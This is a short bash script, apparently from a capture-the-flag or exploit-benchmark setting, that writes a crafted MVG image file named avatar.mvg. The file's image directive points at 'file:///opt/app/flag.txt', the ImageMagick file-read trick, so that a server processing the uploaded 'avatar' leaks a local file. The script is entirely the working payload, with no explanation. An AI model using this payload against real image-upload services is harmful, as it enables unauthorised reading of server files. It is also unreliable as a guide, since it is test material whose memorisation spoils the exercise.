#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
cat > "$OUT_DIR/avatar.mvg" <<'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'file:///opt/app/flag.txt'
pop graphic-context
EOF
